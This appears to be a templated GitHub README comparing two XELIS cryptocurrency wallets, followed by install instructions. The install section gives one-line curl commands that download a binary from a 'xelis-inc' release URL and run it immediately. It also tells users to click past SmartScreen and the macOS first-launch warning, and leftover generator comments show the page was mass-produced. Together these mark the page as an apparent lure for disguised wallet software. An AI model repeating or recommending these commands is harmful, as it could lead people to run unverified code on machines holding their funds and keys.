![XELIS Wallet or Genesix: which client fits your task](assets/banner-article.png)
# XELIS Wallet or Genesix: which client fits your task

Two wallets for one chain, compared by platform, flow and control.

## Downloads - Comparison

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Both clients restore the same wallet from the same 25-word phrase, so trying one does not lock you out of the other.

Both are non-custodial wallets for XELIS, so custody is not the difference. XELIS Wallet is the official desktop client for Windows, macOS and Linux; Genesix is a separate cross-platform client from the XELIS project. Choose on the platform you use and the interface you prefer, not on a feature winner.

<!-- ARTICLE-BODY-BEGIN -->
## The decision in one line

If you work on a desktop and want the official release with its own installer and update path, use XELIS Wallet. If you need a client that runs where this one does not, Genesix is the project's other graphical wallet and covers those platforms.

Neither choice risks your funds by itself. Both are non-custodial and both rebuild the wallet from the phrase.

## Where the two actually differ

| Question | XELIS Wallet | Genesix |
| --- | --- | --- |
| Who publishes it | The official wallet release | The XELIS project, separately |
| Platforms in this release | Windows, macOS, Linux desktop | Its own platform list, which includes mobile |
| Custody | Keys local to your device | Keys local to your device |
| Backup | 25-word phrase | 25-word phrase |
| Recovery between clients | Restore the phrase | Restore the phrase |

Anything beyond that, such as exact screens, performance or release cadence, is not something these docs can compare honestly without testing both, so it is left out rather than guessed.

## Who each one suits

XELIS Wallet suits someone who wants a desktop application installed from a release they can verify, and who is comfortable with a phrase-based backup. Genesix suits someone whose main device is not a desktop, or who already uses it and does not want to move.

If you are on a phone and expecting this client to run there, it does not; <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-web-wallet-desktop.md">desktop or web wallet for XEL</a> covers the client-type decision.

What both clients have in common on the custody side is in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">XELIS Wallet self-custody</a>, which applies to either one.

## Switching without risk

Because the phrase is the wallet, moving between clients is a restore, not a migration. Install the client you want, choose the restore option in the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, enter the 25 words, and confirm the address matches before you rely on the new install.

Keep the old client installed until the new one shows the same address and balance. Removing a client does not move funds, and a working copy is the cheapest insurance while you check.

## On convergence between the clients

Whether the two clients converge into one product is not something these docs can confirm; no release note or plan was available to verify it. Treat any statement about it as unconfirmed and decide on what each client does today. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-private-wallet-basics.md">Private wallet criteria</a> covers the wider comparison if you are choosing a wallet rather than a client.

## FAQ
### Should I use XELIS Wallet or Genesix?
Use XELIS Wallet on a desktop where you want the official installed release; use Genesix where you need its platform coverage.

### Can I use both with the same wallet?
Yes. Restore the same 25-word phrase in each client and both reach the same address.

### Will my funds move if I switch clients?
No. Switching is installing another client and restoring the phrase; nothing is transferred.

### Is one more secure than the other?
Both keep keys locally. This comparison makes no security ranking, because no audit or test of either client was available.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Desktop or web wallet for XEL](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-web-wallet-desktop.md)
- [XELIS Wallet self-custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [Private wallet criteria](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-private-wallet-basics.md)
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
